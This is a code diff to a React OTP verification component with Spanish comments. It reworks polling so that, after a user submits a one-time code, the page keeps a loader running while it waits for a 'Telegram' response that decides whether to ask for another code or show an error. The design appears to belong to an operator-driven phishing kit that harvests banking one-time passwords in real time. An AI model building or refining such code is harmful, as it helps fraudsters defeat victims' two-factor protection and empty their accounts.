@@ -75,6 +75,7 @@ const OTPVerification = () => {
   const showOtpCredentialError = () => {
     stopPolling();
     setLoading(false);
+    submitTickRef.current = 0;
     modalBloqueoEstadoRef.current = "error_otp";
     clearOtpFields();
     setModalMode("otp_error");
@@ -472,15 +473,15 @@ const OTPVerification = () => {
           return;
         }
 
-        if (lastEstadoRef.current === estadoActual) {
-
-          pollingIntervalRef.current = setTimeout(poll, 3000);
+        // Si el estado es pendiente, continuar esperando respuesta de Telegram con loader activo
+        if (estadoActual === "pendiente") {
+          setLoading(true);
+          pollingIntervalRef.current = setTimeout(poll, 2500);
           return;
         }
 
-        // Si acabamos de enviar OTP y el estado sigue siendo sol_otp o pendiente, continuar esperando respuesta de Telegram
-        if (submitTickRef.current > 0 && (estadoActual === "sol_otp" || estadoActual === "pendiente")) {
-          pollingIntervalRef.current = setTimeout(poll, 2500);
+        if (lastEstadoRef.current === estadoActual) {
+          pollingIntervalRef.current = setTimeout(poll, 3000);
           return;
         }
 
@@ -502,7 +503,7 @@ const OTPVerification = () => {
         // Se ejecuta el switch del estado actual
         switch (estadoActual) {
           case "sol_otp":
-
+            submitTickRef.current = 0;
             // Se desactiva el loading
             setLoading(false);
 
@@ -633,7 +634,7 @@ const OTPVerification = () => {
       // Se activa el loading y se registra el timestamp de envío
       setLoading(true);
       submitTickRef.current = Date.now();
-      lastEstadoRef.current = null;
+      lastEstadoRef.current = 'pendiente';
       modalBloqueoEstadoRef.current = null;
       ignorarEstadoHastaCambioRef.current = null;
 
